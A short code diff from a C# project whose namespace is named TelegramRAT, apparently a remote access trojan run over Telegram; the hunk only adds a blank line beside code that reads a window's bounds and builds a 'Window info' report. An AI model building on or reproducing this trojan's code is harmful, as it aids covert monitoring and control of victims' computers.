@@ -1027,6 +1027,7 @@ namespace TelegramRAT
                                 }
 
                                 Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
+                                
                                 string info =
                                 "Window info\n" +
                                 "\n" +
